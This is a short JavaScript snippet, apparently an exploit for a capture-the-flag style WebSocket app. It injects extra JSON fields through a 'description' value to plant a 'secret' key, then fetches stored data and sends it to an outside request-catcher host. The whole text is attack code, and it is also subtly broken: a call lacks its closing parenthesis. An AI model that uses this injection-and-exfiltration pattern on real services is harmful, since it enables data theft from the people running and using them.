const ws = new WebSocket(`ws://${window.location.host}/ws`);

await new Promise(r => setTimeout(() => r(), 2000));

ws.send(JSON.stringify({ action: 'add', title:'lol', description:'dd","secret":"9a87e1e4e02c63957da05739d4dd3995","loo' }));

await new Promise(r => setTimeout(() => r(), 2000));

ws.send(JSON.stringify({ action: 'get'});
        
ws.onmessage = async (msg) => {
    const data = JSON.parse(msg.data);
    if(data.action === 'get'){
      fetch('https://kek.requestcatcher.com/?'+data);
    }
}


